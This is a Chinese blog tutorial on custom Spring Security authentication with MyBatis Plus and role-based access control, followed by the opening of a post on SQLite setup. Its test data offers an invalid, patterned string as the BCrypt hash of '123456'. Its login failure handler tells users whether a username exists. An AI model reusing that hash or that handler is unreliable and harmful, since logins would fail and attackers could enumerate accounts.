<p>前期准备：搭建基础环境</p>
</blockquote>
<p><strong>2.1 数据库设计</strong><br>首先我们需要设计用户表和角色表，这里采用最经典的多对多关系模型：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 用户表</span></span><br><span class="line"><span class="keyword">CREATE TABLE</span> `sys_user` (</span><br><span class="line">  `id` <span class="type">bigint</span> <span class="keyword">NOT NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;用户ID&#x27;</span>,</span><br><span class="line">  `username` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;用户名&#x27;</span>,</span><br><span class="line">  `password` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;加密后的密码&#x27;</span>,</span><br><span class="line">  `enabled` tinyint <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;1&#x27;</span> COMMENT <span class="string">&#x27;是否启用(1=启用,0=禁用)&#x27;</span>,</span><br><span class="line">  `create_time` datetime <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `uk_username` (`username`) COMMENT <span class="string">&#x27;用户名唯一&#x27;</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 COMMENT<span class="operator">=</span><span class="string">&#x27;系统用户表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 角色表</span></span><br><span class="line"><span class="keyword">CREATE TABLE</span> `sys_role` (</span><br><span class="line">  `id` <span class="type">bigint</span> <span class="keyword">NOT NULL</span> AUTO_INCREMENT COMMENT <span class="string">&#x27;角色ID&#x27;</span>,</span><br><span class="line">  `role_name` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;角色名称&#x27;</span>,</span><br><span class="line">  `role_code` <span class="type">varchar</span>(<span class="number">50</span>) <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;角色编码&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`id`),</span><br><span class="line">  <span class="keyword">UNIQUE</span> KEY `uk_role_code` (`role_code`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 COMMENT<span class="operator">=</span><span class="string">&#x27;系统角色表&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 用户角色关联表</span></span><br><span class="line"><span class="keyword">CREATE TABLE</span> `sys_user_role` (</span><br><span class="line">  `user_id` <span class="type">bigint</span> <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;用户ID&#x27;</span>,</span><br><span class="line">  `role_id` <span class="type">bigint</span> <span class="keyword">NOT NULL</span> COMMENT <span class="string">&#x27;角色ID&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`user_id`,`role_id`),</span><br><span class="line">  KEY `fk_role_id` (`role_id`),</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> `fk_user_id` <span class="keyword">FOREIGN KEY</span> (`user_id`) <span class="keyword">REFERENCES</span> `sys_user` (`id`),</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> `fk_role_id` <span class="keyword">FOREIGN KEY</span> (`role_id`) <span class="keyword">REFERENCES</span> `sys_role` (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4 COMMENT<span class="operator">=</span><span class="string">&#x27;用户角色关联表&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>注意这里我们给用户名创建了唯一索引，这是为了避免重复注册的问题。密码字段预留了 100 位长度，因为 BCrypt 加密后的字符串通常在 60 位左右。</p>
<p><strong>2.2 项目依赖配置</strong><br>在pom.xml中添加必要的依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Spring Boot Starter Security --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-security<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Spring Boot Starter Web --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- MySQL驱动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- MyBatis Plus --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Lombok --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">optional</span>&gt;</span>true<span class="tag">&lt;/<span class="name">optional</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>为什么选择 MyBatis Plus？因为它提供的 CRUD 接口可以帮我们减少 70% 的重复代码，特别是BaseMapper中的方法完全能满足用户查询需求，这也是很多企业开发的首选方案。</p>
<p><strong>2.3 数据源配置</strong><br>在application.yml中配置数据库连接信息：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/security_demo?useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=Asia/Shanghai</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*.xml</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.example.securitydemo.entity</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span> <span class="comment"># 开启驼峰命名转换</span></span><br></pre></td></tr></table></figure>
<p>这里有个细节需要注意：MySQL 8.0 以上版本必须指定serverTimezone，否则会出现时区错误。推荐使用Asia&#x2F;Shanghai而不是UTC+8，因为在某些服务器环境下后者可能不被识别。</p>
<blockquote>
<p>核心实现：自定义用户认证体系</p>
</blockquote>
<p><strong>3.1 实体类设计</strong><br>创建与数据库表对应的实体类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(&quot;sys_user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SysUser</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> Boolean enabled;</span><br><span class="line">    <span class="keyword">private</span> LocalDateTime createTime;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(&quot;sys_role&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SysRole</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String roleName;</span><br><span class="line">    <span class="keyword">private</span> String roleCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 Lombok 的@Data注解可以省略 getter、setter 方法，让代码更简洁。@TableName注解指定对应的数据库表名，这是 MyBatis Plus 的规范。</p>
<p><strong>3.2 Mapper 层实现</strong><br>创建用户和角色的 Mapper 接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SysUserMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;SysUser&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据用户名查询用户角色</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    List&lt;SysRole&gt; <span class="title function_">selectRolesByUsername</span><span class="params">(String username)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在resources&#x2F;mapper目录下创建SysUserMapper.xml：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> </span></span><br><span class="line"><span class="meta"><span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;com.example.securitydemo.mapper.SysUserMapper&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectRolesByUsername&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.example.securitydemo.entity.SysRole&quot;</span>&gt;</span></span><br><span class="line">        SELECT r.id, r.role_name, r.role_code</span><br><span class="line">        FROM sys_user u</span><br><span class="line">        LEFT JOIN sys_user_role ur ON u.id = ur.user_id</span><br><span class="line">        LEFT JOIN sys_role r ON ur.role_id = r.id</span><br><span class="line">        WHERE u.username = #&#123;username&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个查询非常关键，它通过用户 ID 关联角色表，一次性获取用户拥有的所有角色信息，这是实现基于角色的访问控制（RBAC）的基础。</p>
<p><strong>3.3 实现 UserDetailsService</strong><br>这是整个自定义认证中最核心的部分，我们需要实现 Spring Security 提供的UserDetailsService接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomUserDetailsService</span> <span class="keyword">implements</span> <span class="title class_">UserDetailsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SysUserMapper sysUserMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> UserDetails <span class="title function_">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 1.查询用户信息</span></span><br><span class="line">        LambdaQueryWrapper&lt;SysUser&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(SysUser::getUsername, username);</span><br><span class="line">        <span class="type">SysUser</span> <span class="variable">user</span> <span class="operator">=</span> sysUserMapper.selectOne(queryWrapper);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UsernameNotFoundException</span>(<span class="string">&quot;用户名不存在&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2.查询用户角色</span></span><br><span class="line">        List&lt;SysRole&gt; roles = sysUserMapper.selectRolesByUsername(username);</span><br><span class="line">        List&lt;String&gt; roleCodes = roles.stream()</span><br><span class="line">                .map(SysRole::getRoleCode)</span><br><span class="line">                .collect(Collectors.toList());</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3.转换为UserDetails对象</span></span><br><span class="line">        <span class="keyword">return</span> User.withUsername(user.getUsername())</span><br><span class="line">                .password(user.getPassword())</span><br><span class="line">                .roles(roleCodes.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]))</span><br><span class="line">                .disabled(!user.getEnabled())</span><br><span class="line">                .build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码的执行流程是：当用户登录时，Spring Security 会调用loadUserByUsername方法，我们首先从数据库查询用户信息，如果用户不存在就抛出异常；然后查询该用户的角色列表，将角色编码转换为字符串数组；最后构建User对象返回，这个对象包含了用户名、密码、角色和启用状态等关键信息。</p>
<p><strong>3.4 配置 SecurityConfig</strong><br>创建安全配置类，这是整合 Spring Security 的关键：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSecurity</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CustomUserDetailsService userDetailsService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">securityFilterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">            .authorizeHttpRequests(authorize -&gt; authorize</span><br><span class="line">                .requestMatchers(<span class="string">&quot;/login&quot;</span>).permitAll() <span class="comment">// 登录接口允许匿名访问</span></span><br><span class="line">                .requestMatchers(<span class="string">&quot;/admin/**&quot;</span>).hasRole(<span class="string">&quot;ADMIN&quot;</span>) <span class="comment">// admin路径需要ADMIN角色</span></span><br><span class="line">                .requestMatchers(<span class="string">&quot;/user/**&quot;</span>).hasAnyRole(<span class="string">&quot;ADMIN&quot;</span>, <span class="string">&quot;USER&quot;</span>) <span class="comment">// user路径需要ADMIN或USER角色</span></span><br><span class="line">                .anyRequest().authenticated() <span class="comment">// 其他请求需要认证</span></span><br><span class="line">            )</span><br><span class="line">            .formLogin(form -&gt; form</span><br><span class="line">                .defaultSuccessUrl(<span class="string">&quot;/index&quot;</span>, <span class="literal">true</span>) <span class="comment">// 登录成功后跳转的页面</span></span><br><span class="line">            )</span><br><span class="line">            .logout(logout -&gt; logout</span><br><span class="line">                .logoutSuccessUrl(<span class="string">&quot;/login?logout&quot;</span>) <span class="comment">// 退出登录后跳转的页面</span></span><br><span class="line">            );</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> PasswordEncoder <span class="title function_">passwordEncoder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 使用BCrypt加密密码</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> AuthenticationManager <span class="title function_">authenticationManager</span><span class="params">(AuthenticationConfiguration config)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> config.getAuthenticationManager();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们做了几件重要的事情：</p>
<ul>
<li>配置了 URL 访问权限：登录接口允许匿名访问，<code>/admin/**路径需要 ADMIN 角色，/user/**</code>路径需要 ADMIN 或 USER 角色，其他路径都需要认证后才能访问。</li>
<li>配置了表单登录和退出登录的跳转页面，这是 Web 应用最常用的登录方式。</li>
<li>定义了PasswordEncoder为BCryptPasswordEncoder，这是 Spring 官方推荐的密码加密方式，它会自动生成随机盐值，安全性非常高。</li>
<li>暴露了AuthenticationManager，方便我们在后续的控制器中处理登录逻辑。</li>
</ul>
<blockquote>
<p>功能测试：验证鉴权效果</p>
</blockquote>
<p><strong>4.1 准备测试数据</strong><br>首先插入测试用户和角色：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 插入角色</span></span><br><span class="line"><span class="keyword">INSERT INTO</span> `sys_role` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;管理员&#x27;</span>, <span class="string">&#x27;ADMIN&#x27;</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> `sys_role` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;普通用户&#x27;</span>, <span class="string">&#x27;USER&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 插入用户（密码是123456加密后的结果）</span></span><br><span class="line"><span class="keyword">INSERT INTO</span> `sys_user` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;$2a$10$Gd7QJ8dL9eXl8V6wLz5i5OQJQZJQZJQZJQZJQZJQZJQZJQZJQZ&#x27;</span>, <span class="number">1</span>, NOW());</span><br><span class="line"><span class="keyword">INSERT INTO</span> `sys_user` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;$2a$10$Gd7QJ8dL9eXl8V6wLz5i5OQJQZJQZJQZJQZJQZJQZJQZJQZJQZ&#x27;</span>, <span class="number">1</span>, NOW());</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 关联用户角色</span></span><br><span class="line"><span class="keyword">INSERT INTO</span> `sys_user_role` <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="number">1</span>); <span class="comment">-- admin拥有ADMIN角色</span></span><br><span class="line"><span class="keyword">INSERT INTO</span> `sys_user_role` <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="number">2</span>); <span class="comment">-- user拥有USER角色</span></span><br></pre></td></tr></table></figure>
<p>注意这里的密码是用BCryptPasswordEncoder加密后的结果，原始密码都是 123456。如果你需要生成新的密码，可以写一个简单的测试方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PasswordTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">PasswordEncoder</span> <span class="variable">encoder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> encoder.encode(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        System.out.println(password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>4.2 创建测试接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(Authentication authentication)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;欢迎&quot;</span> + authentication.getName() + <span class="string">&quot;登录系统&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/admin/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">adminHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;管理员专属接口&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/user/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">userHello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;用户专属接口&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这些接口用于验证不同角色的访问权限：</p>
<ul>
<li>&#x2F;index：任何登录用户都可以访问</li>
<li>&#x2F;admin&#x2F;hello：只有 ADMIN 角色可以访问</li>
<li>&#x2F;user&#x2F;hello：ADMIN 和 USER 角色都可以访问</li>
</ul>
<p><strong>4.3 测试场景验证</strong></p>
<ul>
<li>未登录访问：直接访问&#x2F;index会被重定向到登录页面，这符合我们的配置。</li>
<li>user 用户登录：<br>  1.可以访问&#x2F;index和&#x2F;user&#x2F;hello<br>  2.访问&#x2F;admin&#x2F;hello会出现 403 错误，提示权限不足</li>
<li>admin 用户登录：<br>  1.可以访问所有接口，包括&#x2F;admin&#x2F;hello<br>  2.这说明角色权限控制生效了</li>
<li>密码错误测试：输入错误密码会提示 “Bad credentials”，这是 Spring Security 的默认提示。</li>
<li>用户不存在测试：输入不存在的用户名会提示 “用户名不存在”，这是我们在CustomUserDetailsService中自定义的异常信息。</li>
</ul>
<blockquote>
<p>进阶优化：提升安全性和可维护性</p>
</blockquote>
<p><strong>5.1 密码加密存储最佳实践</strong><br>虽然我们已经使用了 BCrypt 加密，但在实际开发中还有几点需要注意：</p>
<ul>
<li>注册时加密：用户注册时必须对密码进行加密处理，绝对不能明文存储</li>
<li>密码策略：建议设置密码复杂度要求，比如长度不少于 8 位，包含大小写字母、数字和特殊符号</li>
<li>定期更换：可以在系统中添加密码定期更换提醒功能</li>
</ul>
<p><strong>5.2 异常处理优化</strong><br>默认的异常信息不够友好，我们可以自定义认证失败处理器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomAuthenticationFailureHandler</span> <span class="keyword">implements</span> <span class="title class_">AuthenticationFailureHandler</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAuthenticationFailure</span><span class="params">(HttpServletRequest request, HttpServletResponse response, </span></span><br><span class="line"><span class="params">                                       AuthenticationException exception)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=utf-8&quot;</span>);</span><br><span class="line">        Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        result.put(<span class="string">&quot;code&quot;</span>, <span class="number">401</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (exception <span class="keyword">instanceof</span> UsernameNotFoundException) &#123;</span><br><span class="line">            result.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;用户名不存在&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (exception <span class="keyword">instanceof</span> BadCredentialsException) &#123;</span><br><span class="line">            result.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;密码错误&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            result.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        response.getWriter().write(mapper.writeValueAsString(result));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在SecurityConfig中配置：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.formLogin(form -&gt; form</span><br><span class="line">    .defaultSuccessUrl(<span class="string">&quot;/index&quot;</span>, <span class="literal">true</span>)</span><br><span class="line">    .failureHandler(customAuthenticationFailureHandler) <span class="comment">// 添加失败处理器</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>这样前端就能得到结构化的错误信息，方便进行友好提示。</p>
<p><strong>5.3 权限细化控制</strong><br>如果需要更细粒度的权限控制，可以将角色（Role）和权限（Permission）分离，实现基于权限的访问控制（PBAC）。基本思路是：</p>
<ul>
<li>增加权限表和角色权限关联表</li>
<li>在UserDetails中添加权限信息</li>
<li>在配置中使用hasAuthority替代hasRole</li>
</ul>
<p>这种方式适合权限复杂的大型系统，比如电商平台的后台管理系统。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3集成四【SQLLite数据库框架】</title>
    <url>/cnblogs.github.io/p/27db.html</url>
    <content><![CDATA[<blockquote>
<p>项目依赖添加</p>
</blockquote>
<p>首先，打开你的 Spring Boot3 项目的pom.xml文件，添加 SQLLite 的驱动依赖。在<dependencies>标签中加入以下代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.xerial<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>sqlite-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.42.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里使用的sqlite-jdbc驱动是 Java 连接 SQLLite 数据库的常用选择，3.42.0.0版本是经过大量实践验证，兼容性和稳定性都较为出色的版本。但在实际使用中，如果遇到与其他依赖冲突的情况，可以尝试升级或降级驱动版本。同时，别忘了 Spring Boot3 自带的数据库连接相关依赖，确保项目能够正常进行数据库操作配置。Spring Boot3 会自动根据添加的依赖进行相关配置，比如数据源的自动配置，但前提是依赖添加正确且完整。</p>
<blockquote>
<p>配置数据源</p>
</blockquote>
<p>在application.properties或application.yml文件中进行数据源配置。以application.yml为例，配置如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:sqlite:/your/path/your.db</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">org.sqlite.JDBC</span></span><br><span class="line">    <span class="attr">username:</span></span><br><span class="line">    <span class="attr">password:</span></span><br></pre></td></tr></table></figure>
